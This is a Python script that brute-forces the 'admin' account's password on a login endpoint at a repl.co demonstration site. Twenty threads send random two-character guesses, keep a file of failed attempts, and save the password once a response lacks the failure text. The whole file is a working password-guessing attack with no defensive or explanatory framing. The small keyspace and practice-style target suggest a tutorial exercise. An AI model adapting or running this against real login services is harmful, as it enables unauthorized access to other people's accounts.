import requests
import random
from threading import Thread
import os

url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
username = 'admin'

def request_sender(username, password):
    data = {
        "username" : username,
        "password" : password
    }

    r = requests.get(url, data=data)
    return r


allchars = "abcdefghijklmnopqrstuvwxyz0123456789"

def main():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndcode = random.choices(allchars, k=2)
            code = "".join(rndcode)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if code in tries:
                pass
            else:
                valid = True
            
        r = request_sender(username, code)

        if 'failed to login' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{code}\n")
                f.close()
            print(f"Incorrect {code}\n")
        else:
            print(f"Correct Password {code}!\n")
            with open("correct_pass.txt", "w") as f:
                f.write(code)
            break


for x in range(20):
    Thread(target=main).start()
